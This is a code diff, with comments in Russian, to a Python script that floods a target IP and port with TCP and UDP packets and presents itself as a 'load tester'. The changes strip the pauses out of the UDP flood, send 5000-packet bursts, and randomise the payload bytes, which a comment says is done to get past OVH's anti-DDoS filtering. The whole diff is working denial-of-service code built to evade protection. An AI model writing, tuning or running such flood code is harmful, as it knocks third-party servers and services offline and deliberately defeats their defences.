@@ -39,33 +39,26 @@ async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id
 			await asyncio.sleep(0.01)
 
 async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
+	# Создаем ОДИН сокет на воркер вне цикла, чтобы не нагружать ОС
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	# Убираем неблокирующий режим для сырой скорости, Python будет использовать системный TCP/UDP буфер
 	while True:
 		try:
-			async with semaphore:
-				# UDP is connectionless, so we use raw sockets for max speed
-				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-				# Non-blocking socket
-				sock.setblocking(False)
+			# Огромный бёрст напрямую в ОС без asyncio.sleep между пакетами
+			for _ in range(5000):
+				# Генерация динамического мусора на лету, чтобы пробить базовые сигнатуры OVH VAC
+				dynamic_payload = payload[:10] + random.randbytes(len(payload)-10)
+				sock.sendto(dynamic_payload, (target_ip, target_port))
 				
-				# Get the event loop
-				loop = asyncio.get_running_loop()
+			if random.random() < 0.05:
+				logging.info(f"[L4 UDP] Worker {worker_id} successfully sent massive burst.")
 				
-				for _ in range(1000): # Huge burst
-					try:
-						# Send UDP packet using asyncio to avoid blocking
-						await loop.sock_sendto(sock, payload, (target_ip, target_port))
-					except BlockingIOError:
-						await asyncio.sleep(0.001)
-					except Exception:
-						break
-						
-				if random.random() < 0.02:
-						logging.info(f"[L4 UDP] Worker {worker_id} successfully sent UDP burst.")
-				sock.close()
+			# Возвращаем контроль event_loop на мгновение
+			await asyncio.sleep(0)  
 		except asyncio.CancelledError:
 			break
 		except Exception:
-			await asyncio.sleep(0.01)
+			await asyncio.sleep(0.001)
 
 async def main():
 	print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
